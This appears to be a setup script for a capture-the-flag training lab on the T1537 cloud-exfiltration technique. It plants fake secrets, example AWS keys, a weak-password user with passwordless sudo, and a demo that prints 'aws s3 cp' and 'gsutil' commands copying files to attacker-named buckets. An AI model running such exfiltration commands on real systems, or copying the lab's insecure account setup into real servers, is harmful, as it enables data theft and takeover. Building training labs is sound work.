#!/bin/bash
set -euo pipefail
PLAYER="player"; PASS="Player@123"
FLAG="HACKTIFY{CLOUD_ACCOUNT_TRANSFER_$(hostname|sha256sum|cut -c1-8)}"
id "$PLAYER" &>/dev/null || { useradd -m -s /bin/bash "$PLAYER"; echo "$PLAYER:$PASS"|chpasswd; }
echo "$PLAYER ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/player-t1537; chmod 440 /etc/sudoers.d/player-t1537
mkdir -p /opt/sensitive-data
echo "$FLAG" > /opt/sensitive-data/corp_secrets.txt
echo "M&A target: InnovateTech Ltd" >> /opt/sensitive-data/corp_secrets.txt
echo "Bid price: $450M" >> /opt/sensitive-data/corp_secrets.txt
chmod 644 /opt/sensitive-data/corp_secrets.txt
# Plant "discovered" cloud credentials (simulates finding keys on server)
mkdir -p /home/$PLAYER/.aws
cat > /home/$PLAYER/.aws/credentials << 'AWSEOF'
[default]
aws_access_key_id = AKIAIOSFODNN7EXAMPLE
aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
region = us-east-1
# NOTE: These are example/demonstration keys — not real
AWSEOF
chmod 600 /home/$PLAYER/.aws/credentials
chown -R $PLAYER:$PLAYER /home/$PLAYER/.aws
cat > /opt/cloud_transfer_demo.py << 'PYEOF'
#!/usr/bin/env python3
"""
T1537 – Transfer Data to Cloud Account (Educational Demo)
Shows how attackers use discovered cloud credentials to exfiltrate data.
"""
import os, sys, json, base64

def demo_aws_exfil(file_path, bucket="attacker-bucket"):
    print(f"[*] T1537: AWS S3 Transfer Demo")
    print(f"[*] Source: {file_path}")
    print(f"[*] Target: s3://{bucket}/stolen_data.txt")
    print()
    print(">>> Real attack commands:")
    print(f"  aws s3 cp {file_path} s3://{bucket}/")
    print(f"  aws s3 sync /opt/sensitive-data/ s3://{bucket}/corp-loot/")
    print()
    print(">>> With stolen credentials:")
    print(f"  AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE \\")
    print(f"  AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI... \\")
    print(f"  aws s3 cp {file_path} s3://{bucket}/")
    print()
    data = open(file_path).read()
    print(f"[*] Data to exfiltrate ({len(data)} bytes):")
    print(f"  {data[:100]}...")
    print()
    print(f"[*] Base64 payload (what would be uploaded):")
    print(f"  {base64.b64encode(data.encode()).decode()[:80]}...")

def demo_gcs_exfil(file_path, bucket="attacker-gcs-bucket"):
    print(f"\n[*] GCS (Google Cloud Storage) Transfer Demo")
    print(f"  gsutil cp {file_path} gs://{bucket}/")
    print(f"  gsutil rsync -r /opt/sensitive-data/ gs://{bucket}/loot/")

if __name__ == '__main__':
    f = sys.argv[1] if len(sys.argv) > 1 else "/opt/sensitive-data/corp_secrets.txt"
    demo_aws_exfil(f)
    demo_gcs_exfil(f)
    print("\n[*] Flag is in the source file - reading...")
    print(open(f).readline().strip())
PYEOF
chmod 755 /opt/cloud_transfer_demo.py
cat > /home/$PLAYER/README.txt << 'RMEOF'
=== T1537 Transfer Data to Cloud Account ===
Login  : player / Player@123
Scenario: You've found AWS credentials in ~/.aws/credentials
          (common finding during post-exploitation)
Goal   : 1. Examine the discovered credentials: cat ~/.aws/credentials
         2. Run the demo: python3 /opt/cloud_transfer_demo.py /opt/sensitive-data/corp_secrets.txt
         3. Understand how aws s3 cp / gsutil cp would exfiltrate data
         4. Retrieve the flag
RMEOF
chown $PLAYER:$PLAYER /home/$PLAYER/README.txt
echo "[+] T1537 setup complete."
